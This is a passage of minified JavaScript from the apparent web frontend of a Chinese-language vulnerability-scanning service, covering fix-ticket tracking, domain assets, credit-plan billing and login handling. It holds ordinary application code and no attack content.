i=await Vi(e),s=we.getState().tickets.filter(function(r){return r.id!==e});return we.setState({tickets:s}),i}async function eo(e,i){const t=[];for(let o=0;o<e.length;o++)t.push(await ui(e[o],{status:i}));const r=we.getState().tickets.map(function(o){return e.indexOf(o.id)!==-1?Object.assign({},o,{status:i}):o});return we.setState({tickets:r}),t}async function to(e){const i=[];for(let r=0;r<e.length;r++)i.push(await Vi(e[r]));const s=we.getState().tickets.filter(function(r){return e.indexOf(r.id)===-1});return we.setState({tickets:s}),i}async function io(e){const i=await Ze("/api/fix-tickets/"+e+"/verify",{rescan:!0});return we.setState({lastVerifiedAt:Date.now()}),i}const We={severityClass:function(e){return e==="high"||e==="critical"?"high":e==="medium"?"medium":"low"},severityLabel:function(e){return{critical:"严重",high:"高危",medium:"中危",low:"低危"}[e]||e},statusLabel:function(e){return{pending:"待修复",confirmed:"已确认",applying:"应用中",in_progress:"修复中",fixed:"已修复",failed:"修复失败",rolled_back:"已回滚",ignored:"已忽略"}[e]||e}};let Ri=!1;function no(e){if(Ri)return;Ri=!0;const i=document.body;i&&(i.addEventListener("click",ro),i.addEventListener("change",so))}function ro(e){if(e.target.closest(".ticket-checkbox")||e.target.closest(".ticket-check"))return;const i=e.target.closest("[data-action]");if(!i)return;const t=i.dataset.action,s=i.dataset.id?parseInt(i.dataset.id,10):null,r=i.dataset.status||null;switch(t){case"switch-ticket-tab":r&&oo(r);break;case"show-detail":s&&Vt(s);break;case"verify":s&&vo(s);break;case"edit-notes":s&&uo(s);break;case"open-fixer":s&&In(s);break;case"open-report":s&&fo(s);break;case"copy-summary":s&&go(s);break;case"delete":s&&po(s);break;case"batch-update":r&&ao(r);break;case"batch-delete":lo();break;case"toggle-select-all":En(i);break}}function so(e){const i=e.target;if(i.classList.contains("ticket-checkbox")){ki();return}const t=i.closest("[data-action]");if(!t)return;const s=t.dataset.action,r=t.dataset.id?parseInt(t.dataset.id,10):null;switch(s){case"change-status":r&&co(r,i.value);break;case"toggle-select-all":En(i);break}}function oo(e){Gs(e),document.querySelectorAll(".ticket-tab").forEach(function(i){i.classList.toggle("active",i.dataset.status===e)}),Sn()}function tt(){if(!ve()){Ne("ticket-workbench","none"),Ne("ticket-empty","block"),Ne("ticket-batch-bar","none"),Ui("ticket-empty",'<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录查看工单</p></div>');return}return Vs().then(function(){Sn()}).catch(function(e){M("加载工单失败: "+e.message,"error")})}function Sn(){let e=document.getElementById("ticket-list"),i=document.getElementById("ticket-empty"),t=document.getElementById("ticket-batch-bar"),s=document.getElementById("ticket-workbench"),r=document.getElementById("ticket-detail-panel");if(!e)return;let o=Js();if(o.length===0){e.innerHTML="",i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>');return}i&&(i.style.display="none"),t&&(t.style.display="flex"),s&&(s.style.display="flex");let a="";o.forEach(function(n){let c=We.severityClass(n.severity),p=We.severityLabel(n.severity),v=We.statusLabel(n.status);a+='<tr class="ticket-row" data-action="show-detail" data-id="'+n.id+'">',a+='<td><label class="ticket-check"><input type="checkbox" class="ticket-checkbox" value="'+n.id+'"></label></td>',a+='<td class="ticket-title-cell">'+E(n.finding_name)+"</td>",a+='<td><span class="ticket-severity '+c+'">'+p+"</span></td>",a+='<td><span class="ticket-status-badge">'+v+"</span></td>",a+='<td class="ticket-date-cell">'+(n.created_at||"")+"</td>",a+="</tr>"}),e.innerHTML=a,ki()}function Vt(e){let i=wt(e);if(!i)return;let t=document.getElementById("ticket-detail-panel");if(!t)return;let s=We.severityClass(i.severity),r=We.severityLabel(i.severity),o=We.statusLabel(i.status),a='<div class="ticket-detail-header">';if(a+='<div class="ticket-detail-title">'+E(i.finding_name)+"</div>",a+='<div class="ticket-detail-badges"><span class="ticket-severity '+s+'">'+r+'</span><span class="ticket-status-badge">'+o+"</span></div>",a+="</div>",a+='<div class="ticket-detail-meta">工单 #'+i.id+(i.scan_id?" · 扫描 #"+i.scan_id:"")+" · "+(i.created_at||"")+"</div>",a+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">',a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">建议：'+(i.status==="fixed"?"尽快复测确认":i.status==="failed"?"回看失败原因并回滚":i.status==="applying"?"等待变更生效后复测":"推进修复并保留变更记录")+"</div>",a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">优先级：'+r+"</div>",i.finding_type&&(a+='<div style="background:rgba(75,110,175,0.12);color:var(--primary-light);border:1px solid rgba(75,110,175,0.28);padding:4px 10px;border-radius:999px;font-size:12px">类型：'+E(i.finding_type)+"</div>"),a+="</div>",a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复闭环</div>',a+='<div class="ticket-timeline" id="ticket-timeline-'+i.id+'"><div class="ticket-timeline-loading">正在读取时间线...</div></div></div>',i.fix_code&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">修复代码</div><pre class="ticket-detail-code">'+E(i.fix_code)+"</pre></div>"),i.url&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">漏洞位置</div><code class="ticket-detail-url">'+E(i.url)+"</code></div>"),i.notes&&(a+='<div class="ticket-detail-section"><div class="ticket-detail-label">备注</div><div class="ticket-detail-notes">'+E(i.notes)+"</div></div>"),i.diff_summary&&i.diff_summary!=="{}")try{let n=JSON.parse(i.diff_summary);a+='<div class="ticket-detail-section"><div class="ticket-detail-label">复测结果</div>',a+='<div class="ticket-diff-summary">',n.verified_fixed&&(a+='<div class="ticket-diff-item success">已验证修复</div>'),n.summary&&(a+='<div class="ticket-diff-stats">消除 '+(n.summary.eliminated_count||0)+" · 新增 "+(n.summary.new_count||0)+" · 保留 "+(n.summary.retained_count||0)+"</div>",a+='<div class="ticket-diff-score">评分变化：'+(n.before_score||0)+" → "+(n.after_score||0)+" ("+(n.score_delta>0?"+":"")+n.score_delta+")</div>"),a+="</div></div>"}catch{}a+='<div class="ticket-detail-actions">',a+='<select class="ticket-status-select" data-action="change-status" data-id="'+i.id+'" title="选择当前修复进度">',a+='<option value="pending"'+(i.status==="pending"?" selected":"")+">待修复</option>",a+='<option value="confirmed"'+(i.status==="confirmed"?" selected":"")+">已确认</option>",a+='<option value="applying"'+(i.status==="applying"?" selected":"")+">应用中</option>",a+='<option value="in_progress"'+(i.status==="in_progress"?" selected":"")+">修复中</option>",a+='<option value="fixed"'+(i.status==="fixed"?" selected":"")+">已修复</option>",a+='<option value="failed"'+(i.status==="failed"?" selected":"")+">修复失败</option>",a+='<option value="rolled_back"'+(i.status==="rolled_back"?" selected":"")+">已回滚</option>",a+='<option value="ignored"'+(i.status==="ignored"?" selected":"")+">已忽略</option>",a+="</select>",a+='<button class="ticket-btn primary" data-action="verify" data-id="'+i.id+'">复测验证</button>',a+='<button class="ticket-btn secondary" data-action="open-fixer" data-id="'+i.id+'">去修复器</button>',a+='<button class="ticket-btn secondary" data-action="open-report" data-id="'+i.id+'">回到报告</button>',a+='<button class="ticket-btn secondary" data-action="copy-summary" data-id="'+i.id+'">复制摘要</button>',a+='<button class="ticket-btn secondary" data-action="edit-notes" data-id="'+i.id+'">备注</button>',a+='<button class="ticket-btn danger" data-action="delete" data-id="'+i.id+'">删除</button>',a+="</div>",t.innerHTML=a,ho(i.id),document.querySelectorAll(".ticket-row").forEach(function(n){n.classList.toggle("selected",parseInt(n.dataset.id)===e)})}function ki(){let e=document.querySelectorAll(".ticket-checkbox:checked"),i=document.getElementById("ticket-selected-count");i&&(i.textContent="已选 "+e.length+" 项")}function En(e){let i=e?e.checked:!1;document.querySelectorAll(".ticket-checkbox").forEach(function(t){t.checked=i}),document.querySelectorAll('[data-action="toggle-select-all"]').forEach(function(t){t.checked=i}),ki()}function zn(){let e=[];return document.querySelectorAll(".ticket-checkbox:checked").forEach(function(i){e.push(parseInt(i.value,10))}),e}function ao(e){let i=zn();if(i.length===0){M("请先选择工单","error");return}eo(i,e).then(function(){return M("已批量更新 "+i.length+" 个工单","success"),tt()}).catch(function(t){M("批量更新失败: "+t.message,"error")})}function lo(){let e=zn();if(e.length===0){M("请先选择工单","error");return}confirm("确定删除选中的 "+e.length+" 个工单？")&&to(e).then(function(){return M("已批量删除 "+e.length+" 个工单","success"),tt()}).catch(function(i){M("批量删除失败: "+i.message,"error")})}function co(e,i){Ks(e,i).then(function(){return M("状态已更新","success"),tt().then(function(){Vt(e)})}).catch(function(t){M("更新失败: "+t.message,"error")})}function po(e){confirm("确定删除该工单？")&&Qs(e).then(function(){M("工单已删除","success");let i=document.getElementById("ticket-detail-panel");return i&&(i.innerHTML='<div class="ticket-detail-empty">选择左侧工单查看详情</div>'),tt()}).catch(function(i){M("删除失败: "+i.message,"error")})}function uo(e){let i=wt(e),t=prompt("编辑备注:",i&&i.notes?i.notes:"");t!==null&&Ys(e,t).then(function(){return M("备注已保存","success"),tt().then(function(){Vt(e)})}).catch(function(s){M("保存失败: "+s.message,"error")})}function In(e){let i=wt(e);if(i){try{i.url&&window.localStorage&&localStorage.setItem("vs_fixer_ticket",JSON.stringify({ticket_id:i.id,scan_id:i.scan_id||null,url:i.url,finding_name:i.finding_name||"",finding_type:i.finding_type||"",severity:i.severity||"low"}))}catch{}typeof window.navigateTo=="function"?window.navigateTo("fixer"):window.location.hash="#page-fixer"}}function fo(e){wt(e)&&(typeof window.navigateTo=="function"?window.navigateTo("home"):window.location.hash="#page-home")}function go(e){let i=wt(e);if(!i)return;let t=[];(i.status||"").toLowerCase()!=="done"&&t.push("优先复测并确认修复效果"),((i.severity||"").toLowerCase()==="critical"||(i.severity||"").toLowerCase()==="high")&&t.push("先处理暴露面和高危配置");let s=["工单 #"+i.id,"名称: "+(i.finding_name||""),"等级: "+(We.severityLabel(i.severity)||i.severity||""),"状态: "+(We.statusLabel(i.status)||i.status||""),"来源 URL: "+(i.url||""),"备注: "+(i.notes||""),"下一步: "+(t.length?t.join("；"):"当前工单可直接进入复测")].join(`
`);yt(s).then(function(){M("工单摘要已复制")})}function ho(e){let i=document.getElementById("ticket-timeline-"+e);i&&qe("/api/fix-tickets/"+e+"/timeline").then(function(t){if(!t||!t.timeline){i.innerHTML='<div class="ticket-timeline-empty">暂无时间线数据</div>';return}let s='<div class="ticket-timeline-steps">';t.timeline.forEach(function(r,o){let a="step-"+r.status,n={done:"✓",doing:"●",pending:"○",failed:"✗",rolled_back:"↩"}[r.status]||"○";s+='<div class="ticket-timeline-step '+a+'">',s+='<div class="ticket-timeline-icon">'+n+"</div>",s+='<div class="ticket-timeline-content">',s+='<div class="ticket-timeline-label">'+E(r.label)+"</div>",r.time&&(s+='<div class="ticket-timeline-time">'+E(r.time)+"</div>"),s+="</div></div>",o<t.timeline.length-1&&(s+='<div class="ticket-timeline-line"></div>')}),s+="</div>",i.innerHTML=s}).catch(function(){i.innerHTML='<div class="ticket-timeline-empty">加载失败</div>'})}function vo(e){if(!confirm("确定对工单 #"+e+" 复测验证？系统会重新扫描并对比修复效果。"))return;let i=document.querySelector('.ticket-detail-actions [data-action="verify"][data-id="'+e+'"]');i&&(i.textContent="验证中...",i.disabled=!0),io(e).then(function(t){if(Zt(t)){M(Ht(t),"error"),Re();return}if(t&&t.success){let s=t.status==="fixed"?"复测通过：漏洞已修复！":"复测完成：漏洞仍存在";return M(s,t.status==="fixed"?"success":"warning"),Re(),t.status==="fixed"&&setTimeout(function(){In(e)},300),tt().then(function(){Vt(e)})}else M("验证失败："+(t&&t.error?t.error:"未知错误"),"error")}).catch(function(t){M("验证请求失败","error")}).finally(function(){i&&(i.textContent="复测验证",i.disabled=!1)})}function mo(){try{return localStorage.getItem("vs_token")}catch{return null}}function yo(){return!!mo()}function bo(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}let rt=[];function xo(){if(!yo()){Ui("asset-list",""),Ne("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}ue("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(rt=e.assets,ti(rt)):(rt=[],ti(rt))}).catch(function(e){M("加载资产失败: "+e.message,"error"),rt=[],ti(rt)})}function ti(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let s='<div class="asset-table-wrap"><table class="asset-table">';s+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(r){let o=r.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待人工复核",c=r.score,p="high";c==null?(c="-",p=""):c<50?p="low":c<75&&(p="medium"),s+="<tr>",s+='<td data-label="域名"><div class="asset-domain">'+E(r.domain||"")+'</div><div class="asset-meta">'+E(r.description||"")+"</div></td>",s+='<td data-label="负责人">'+E(r.owner||"-")+"</td>",s+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",s+='<td data-label="评分"><div class="asset-score '+p+'">'+c+"</div></td>",s+='<td data-label="操作"><div class="asset-actions">',s+='<button class="asset-btn primary" onclick="scanAsset('+r.id+", '"+be(r.domain||"")+`')">扫描</button>`,s+='<button class="asset-btn secondary" onclick="editAsset('+r.id+')">编辑</button>',s+='<button class="asset-btn danger" onclick="deleteAsset('+r.id+')">删除</button>',s+="</div></td>",s+="</tr>"}),s+="</tbody></table></div>",i.innerHTML=s}function wo(){let e=document.getElementById("asset-domain").value.trim(),i=document.getElementById("asset-owner").value.trim(),t=document.getElementById("asset-description").value.trim(),s=document.getElementById("asset-form-error");if(!e){s&&(s.textContent="请输入域名",s.style.display="block");return}s&&(s.style.display="none"),ue("/api/assets",{method:"POST",body:JSON.stringify({domain:e,owner:i,description:t})}).then(function(r){return r.json()}).then(function(r){if(r.id||r.asset_id)M("资产添加成功","success"),document.getElementById("asset-domain").value="",document.getElementById("asset-owner").value="",document.getElementById("asset-description").value="",xo();else{let o=bo(r)||"添加失败";s&&(s.textContent=o,s.style.display="block")}}).catch(function(r){s&&(s.textContent="添加失败: "+r.message,s.style.display="block")})}const Cn=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),_i=()=>typeof window.updateUserCredits=="function"&&window.updateUserCredits();function Tn(e){return e==null?"--":"¥"+(e/100).toFixed(2)}function ko(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function _o(e){let i=parseInt(e&&e.credits,10),t=parseInt(e&&e.price_cents,10);return!i||!t?"--":(t/i/100).toFixed(2)}function So(e){if(!e||!e.length)return null;let i=null,t=Number.POSITIVE_INFINITY;return e.forEach(function(s){let r=parseInt(s.credits,10),o=parseInt(s.price_cents,10);if(!r||!o)return;let a=o/r;a<t&&(t=a,i=s.id)}),i}function Eo(e,i){return e.id===i?"推荐":(e.name||"").includes("企业")?"企业版":(e.name||"").includes("专业")?"专业版":(e.name||"").includes("标准")?"标准版":(e.name||"").includes("体验")?"体验版":""}function zo(e){const i=(e.name||"").toLowerCase();return i.includes("企业")?"团队采购 / 扩容":i.includes("专业")?"安全运营 / 交付":i.includes("标准")?"日常扫描 / 复测":i.includes("体验")?"入门起步":"个人 / 试点使用"}function Io(e){const i=parseInt(e&&e.credits,10)||0;return i>=1e3?"企业采购":i>=500?"专业运营":i>=100?"标准使用":"入门起步"}function Co(e){return{mock:"开发环境通道",stripe:"Stripe",alipay:"支付宝",wechat:"微信支付"}[e]||e}function To(e){return{pending:"待支付",paid:"已到账",failed:"失败",cancelled:"已取消"}[e]||e}function An(){if(!ve()){M("请先登录后再查看服务套餐","warn"),Cn("profile");return}Ao(),kt(),Oo()}function Ao(){let e=document.getElementById("billing-plans-list");e&&(e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>',cr().then(function(i){let t=i&&i.data&&i.data.plans||i&&i.plans||[];if(!t.length){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无可用服务套餐</div>';return}let s=So(t),r='<div style="display:flex;flex-direction:column;gap:12px">';r+='<div style="display:flex;flex-wrap:wrap;gap:10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary)">',r+="<div>• 所有订单都会进入服务记录，便于财务对账与追踪</div>",r+="<div>• 额度可立即用于体检、复测、修复验证、报告导出和审计留痕</div>",r+="<div>• 生产环境默认仅开放真实支付；开发环境可用通道</div>",r+="</div>",r+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px">',t.forEach(function(o){let a=o.id===s,n=Eo(o,s),c=a?"var(--warning)":"var(--border)",p=a?"0 0 0 1px rgba(240,167,50,0.35)":"none";r+='<div style="background:var(--bg);border:1px solid '+c+";box-shadow:"+p+';border-radius:2px;padding:14px;display:flex;flex-direction:column;gap:8px;position:relative">',n&&(r+='<div style="position:absolute;top:10px;right:10px;background:'+(a?"var(--warning)":"var(--primary)")+';color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:999px">'+E(n)+"</div>"),r+='<div style="font-size:15px;font-weight:700">'+E(o.name)+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary);min-height:34px">'+E(o.description||"")+"</div>",r+='<div style="font-size:22px;font-weight:700;color:var(--warning)">'+Tn(o.price_cents)+"</div>",r+='<div style="font-size:13px;color:var(--text-secondary)">含 <strong style="color:var(--text)">'+ko(o.credits)+"</strong> 积分</div>",r+='<div style="font-size:12px;color:var(--text-secondary)">约 <strong style="color:var(--text)">'+_o(o)+" 元/积分</strong></div>",r+='<div style="font-size:12px;color:var(--text-secondary)">适合：'+E(zo(o))+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary)">可用于：扫描 / 复扫 / 报告 / 工单 / 审计</div>',r+='<div style="font-size:12px;color:var(--text-secondary)">权限：'+E(Io(o))+"</div>",r+='<button class="fixer-btn primary" style="width:100%;margin-top:auto" onclick="buyPlan('+o.id+', event)">立即购买</button>',r+="</div>"}),r+="</div>",r+='<div style="padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',r+='<div style="font-weight:700;color:var(--text);margin-bottom:4px">购买后流程</div>',r+="<div>1. 选择套餐并完成支付 → 2. 积分立即到账 → 3. 直接进入扫描或复扫 → 4. 结果会进入报告、工单和审计 → 5. 可按项目或团队需求继续升级。</div>",r+="</div>",r+='<div style="margin-top:12px;padding:12px 14px;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.2);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',r+='<div style="font-weight:700;color:var(--primary);margin-bottom:4px">交付前确认</div>',r+="<div>建议上线前重点确认：支付回调签名、积分扣减日志、权限分层、导出权限、审计日志留存，以及客户能否看懂套餐价值与结果证据。</div>",r+="</div>",e.innerHTML=r}).catch(function(i){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">加载套餐失败</div>'}))}function Bo(e,i){if(i&&i.stopPropagation(),!ve()){M("请先登录","warn"),Cn("profile");return}let t="mock";window.__STRIPE_PUBLISHABLE_KEY__&&(t="stripe");let s=(window.__PUBLIC_BASE_URL__||window.location.origin).replace(/\/$/,"");pr({plan_id:e,provider:t,success_url:s+"/billing?status=success",cancel_url:s+"/billing?status=cancel"}).then(function(r){if(!r||!r.success){M(De(r)||"创建订单失败","error");return}r.data&&r.data.checkout_url?window.location.href=r.data.checkout_url:r.data&&r.data.transaction_id?(M("支付成功，积分已到账","success"),_i(),kt()):M("订单状态异常","error")}).catch(function(r){M("购买失败："+(r.message||"网络错误"),"error")})}function kt(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,s=document.getElementById("billing-records-list");s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>',fr(i,t).then(function(r){let o=r&&r.data&&r.data.records||r&&r.records||[],a=r&&r.data&&r.data.total||r&&r.total||o.length,n=r&&r.meta||{},c=n.limit||i,p=n.offset||t,v=Math.floor(p/c)+1,d=Math.max(1,Math.ceil(a/c));Lo(o),pi("billing-records-pagination",v,d,function(f){kt(f)}),Ne("billing-records-pagination",d>1?"flex":"none")}).catch(function(r){s.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取充值记录失败</div>'}))}function Lo(e){let i=document.getElementById("billing-records-list");if(!i)return;if(!e||!e.length){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">暂无服务记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(s){let r=s.amount_cents?Tn(s.amount_cents):"免费",o=s.status==="paid"?"var(--success)":s.status==="pending"?"var(--warning)":"var(--danger)";t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+E(s.plan_name||"充值")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Wt(s.created_at)+" · "+Co(s.payment_provider)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700">'+r+"</div>",t+='<div style="font-size:11px;color:'+o+';margin-top:2px">'+To(s.status)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}function Oo(){let e=new URLSearchParams(window.location.search),i=e.get("status"),t=e.get("transaction_id");if(!(!i&&!t)){if(i==="cancel"){M("支付已取消","warn"),Fi();return}t?(M("正在确认支付结果...","success"),Mo(t)):i==="success"&&(M("支付成功","success"),_i(),kt()),Fi()}}function Fi(){try{let e=new URL(window.location.href);e.searchParams.delete("status"),e.searchParams.delete("transaction_id"),window.history.replaceState({},"",e.toString())}catch{}}function Mo(e){let i=0,t=10,s=setInterval(function(){i++,ur(e).then(function(r){let o=r&&r.data||r;if(o&&o.status==="paid"){clearInterval(s),M("支付成功，积分已到账","success"),_i(),kt();return}i>=t&&(clearInterval(s),M("支付结果确认超时，请稍后刷新查看","warn"))}).catch(function(){i>=t&&clearInterval(s)})},2e3)}function Po(){typeof window<"u"&&(window.buyPlan=Bo,window.loadBillingPage=An)}let di=null;(function(){var i=!1;function t(s){if(!i){i=!0;try{let r=document.createElement("div");r.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);color:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif",r.innerHTML='<div style="max-width:500px;padding:30px;background:#1e293b;border-radius:2px;text-align:center;border:1px solid #c75450"><div style="font-size:48px;margin-bottom:12px">!</div><h2 style="margin:0 0 8px;color:#c75450">页面遇到错误</h2><p style="color:#94a3b8;font-size:14px;margin:0 0 16px;line-height:1.6">页面运行过程中出现了未预期的错误，可以刷新页面试试。</p><p style="color:#64748b;font-size:12px;margin:0 0 16px;font-family:monospace;word-break:break-all">'+(s||"未知错误").substring(0,200)+'</p><button onclick="location.reload()" style="background:#4b6eaf;color:#fff;border:none;padding:10px 24px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600">刷新页面</button></div>',document.body.appendChild(r)}catch(r){console.error("Global error handler failed:",r)}}}window.addEventListener("error",function(s){console.error("Global error:",s.error||s.message),!(s.target&&s.target!==window&&(s.target.tagName==="IMG"||s.target.tagName==="LINK"||s.target.tagName==="SCRIPT"))&&t(s.message||String(s.error))},!0),window.addEventListener("unhandledrejection",function(s){console.error("Unhandled promise rejection:",s.reason)})})();function ke(e){return document.getElementById(e)||null}function Ro(e,i){let t=ke(e);t&&(t.innerHTML=i)}function Fo(e,i){let t=ke(e);t&&(t.style.display=i)}function ji(e,i){let t=document.getElementById(e),s=document.getElementById(i);!t||!s||t.addEventListener("change",function(){typeof window.updateScanStartState=="function"&&window.updateScanStartState()})}function jo(){ji("auth-check-step1","scan-btn-step1"),ji("auth-check","scan-btn");try{Ho()}catch(e){console.warn("restoreAuthCheckbox error:",e)}}var ft=!1;function Ho(){let e=!1;try{e=localStorage.getItem("vs_auth_checked")==="true"}catch{}let i=document.getElementById("auth-check-step1"),t=document.getElementById("auth-check"),s=document.getElementById("batch-auth-check");if(e){ft=!0,i&&(i.checked=!0),t&&(t.checked=!0),s&&(s.checked=!0),ft=!1;let o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=document.getElementById("batch-go-btn");o&&(o.disabled=!1),a&&(a.disabled=!1),n&&(n.disabled=!1)}function r(o,a){o&&o.addEventListener("change",function(){if(ft)return;let n=o.checked;ft=!0,a.forEach(function(d){d&&(d.checked=n)}),ft=!1;let c=document.getElementById("scan-btn-step1"),p=document.getElementById("scan-btn"),v=document.getElementById("batch-go-btn");c&&(c.disabled=!n),p&&(p.disabled=!n),v&&(v.disabled=!n);try{localStorage.setItem("vs_auth_checked",n?"true":"false")}catch{}})}r(i,[t,s]),r(t,[i,s]),r(s,[i,t])}function fe(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function No(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function it(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}function Hi(e,i){let t=ke(e);t&&(i?(t.disabled=!0,t.dataset.originalText=t.dataset.originalText||t.textContent,t.innerHTML='<span class="spinner" style="width:16px;height:16px;margin-right:6px;border-color:rgba(255,255,255,0.3);border-top-color:#fff"></span>'+fe(t.dataset.originalText)):(t.disabled=!1,t.dataset.originalText&&(t.textContent=t.dataset.originalText)))}function Gt(){try{return localStorage.getItem("vs_token")}catch{return null}}function Bn(e){try{localStorage.setItem("vs_token",e)}catch{}}function Ln(){try{localStorage.removeItem("vs_token")}catch{}}function Le(){return!!Gt()}function Do(){try{return localStorage.getItem("vs_username")||""}catch{return""}}var Ni="";function Ke(){let e=Gt();return e?{Authorization:"Bearer "+e}:{}}function Ee(e,i){i=i||{},i.headers=i.headers||{};let t=!!i.skipAuthExpiry,s=Gt();s&&(i.headers.Authorization="Bearer "+s),!i.headers["Content-Type"]&&i.body&&(i.headers["Content-Type"]="application/json");let r=e.indexOf("http")===0?e:Ni+e;return fetch(r,i).then(function(o){if(o.status===404&&e.indexOf("/api/")===0&&e.indexOf("/api/v1/")!==0){let a=e.indexOf("http")===0?e:Ni+"/api/v1"+e.slice(4);return fetch(a,i)}if(o.status===401&&!t){Ln();try{localStorage.removeItem("vs_username")}catch{}throw typeof dt=="function"&&dt(),new Error("登录已过期，请重新登录")}return o}).catch(function(o){throw o.message&&o.message.indexOf("请求失败")>=0?new Error("网络请求失败。请确认本地后端是否已启动。"):o})}async function $t(){let e=document.getElementById("auth-challenge-question"),i=document.getElementById("auth-challenge-question-reg"),t=document.getElementById("auth-challenge-token"),s=document.getElementById("auth-challenge-token-reg"),r=document.getElementById("login-challenge-answer"),o=document.getElementById("reg-challenge-answer");try{let n=await(await fetch("/api/auth/challenge",{credentials:"same-origin"})).json();n&&n.data&&(n=n.data),e&&(e.textContent="验证码："+(n.question||"请先刷新验证码")),i&&(i.textContent="验证码："+(n.question||"请先刷新验证码")),t&&(t.value=n.token||""),s&&(s.value=n.token||""),r&&(r.value=""),o&&(o.value="")}catch{e&&(e.textContent="验证码加载失败，请刷新页面")}}function Uo(){$t()}function On(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),s=document.getElementById("auth-reset"),r=document.getElementById("auth-logged");e==="register"?(i&&(i.style.display="none"),t&&(t.style.display="block"),s&&(s.style.display="none"),r&&(r.style.display="none"),$t()):e==="login"?($t(),i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="none")):e==="reset"&&(i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="block"),r&&(r.style.display="none"))}function dt(){let e=document.getElementById("auth-guest"),i=document.getElementById("auth-register"),t=document.getElementById("auth-reset"),s=document.getElementById("auth-logged"),r=document.getElementById("scan-login-tip"),o=document.getElementById("api-token-input");if(Le()){e&&(e.style.display="none"),i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="block"),r&&(r.style.display="none");let a=Do(),n=document.getElementById("auth-display-name");if(n&&(n.textContent=a||"用户"),o){let c=Gt();o.value=c||"令牌 不可用"}}else e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="block"),o&&(o.value="登录后显示 令牌");typeof window.updateScanStartState=="function"&&window.updateScanStartState(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()}function qo(){if(!Le()){ie("请先登录","error");return}let 